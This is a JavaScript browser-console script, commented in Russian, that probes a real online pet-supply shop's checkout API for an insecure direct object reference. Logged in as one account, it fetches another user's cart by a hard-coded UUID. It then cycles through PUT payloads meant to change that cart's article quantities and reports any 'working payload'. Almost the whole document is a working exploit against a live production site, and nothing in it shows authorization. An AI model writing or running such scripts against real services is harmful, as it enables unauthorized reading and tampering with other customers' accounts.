// ФИНАЛЬНЫЙ ТЕСТ: IDOR Write через PUT метод
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

async function testIDORWrite() {
  console.log("[*] ========================================");
  console.log("[*] FINAL IDOR WRITE TEST");
  console.log("[*] ========================================");
  
  // Шаг 1: Получить корзину Account A
  const cartBefore = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  const beforeCount = cartBefore.articles.length;
  const beforeTotal = cartBefore.summary.grandTotal;
  const articleId = cartBefore.articles[0]?.id;
  const cartId = cartBefore.cartId;
  const sid = cartBefore.sid;
  
  console.log(`[+] Cart before: ${beforeCount} items, ${beforeTotal} EUR`);
  console.log(`[+] Article ID: ${articleId}, Cart ID: ${cartId}, SID: ${sid}`);
  
  // Шаг 2: Попробовать разные варианты payload
  const payloads = [
    { name: "articleId + quantity", payload: { articleId: articleId, quantity: 2 } },
    { name: "id + quantity", payload: { id: articleId, quantity: 2 } },
    { name: "With cartUuid", payload: { articleId: articleId, quantity: 2, cartUuid: CART_UUID } },
    { name: "With sid", payload: { articleId: articleId, quantity: 2, sid: sid } },
    { name: "With cartId", payload: { articleId: articleId, quantity: 2, cartId: cartId } },
    { name: "Full format", payload: { articleId: articleId, quantity: 2, cartUuid: CART_UUID, sid: sid } },
  ];
  
  let successPayload = null;
  
  for (const test of payloads) {
    console.log(`\n[*] Testing: ${test.name}`);
    console.log(`    Payload:`, JSON.stringify(test.payload));
    
    try {
      const response = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
        method: "PUT",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        body: JSON.stringify(test.payload)
      });
      
      const contentType = response.headers.get("content-type") || "";
      const text = await response.text();
      
      console.log(`    Status: ${response.status}, Content-Type: ${contentType}`);
      
      if (response.status === 200 && contentType.includes("application/json")) {
        try {
          const json = JSON.parse(text);
          console.log(`    [!!!] SUCCESS! JSON response received`);
          console.log(`    Response: ${JSON.stringify(json).substring(0, 200)}`);
          successPayload = test.payload;
          break;
        } catch (e) {
          console.log(`    Response (not JSON): ${text.substring(0, 100)}`);
        }
      } else {
        console.log(`    Response: ${text.substring(0, 100)}`);
      }
    } catch (e) {
      console.log(`    Error: ${e.message}`);
    }
  }
  
  // Шаг 3: Проверить корзину после модификации
  console.log("\n[*] Checking cart after modification...");
  const cartAfter = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  const afterCount = cartAfter.articles.length;
  const afterTotal = cartAfter.summary.grandTotal;
  
  console.log(`[+] Cart after: ${afterCount} items, ${afterTotal} EUR`);
  
  if (afterCount !== beforeCount || Math.abs(afterTotal - beforeTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Before: ${beforeCount} items, ${beforeTotal} EUR`);
    console.log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
    console.log("[!!!] Account B successfully modified Account A's cart!");
    if (successPayload) {
      console.log(`[!!!] Working payload:`, JSON.stringify(successPayload));
    }
    console.log("[!!!] Endpoint: PUT /semiprotected/api/checkout/state-api/v2/set-article-quantity");
    return true;
  } else {
    console.log("\n[!] Cart unchanged - write operations may be protected");
    console.log("[!] Need to find exact payload format from Network tab");
    return false;
  }
}

testIDORWrite().catch(e => console.error("[!] Error:", e));

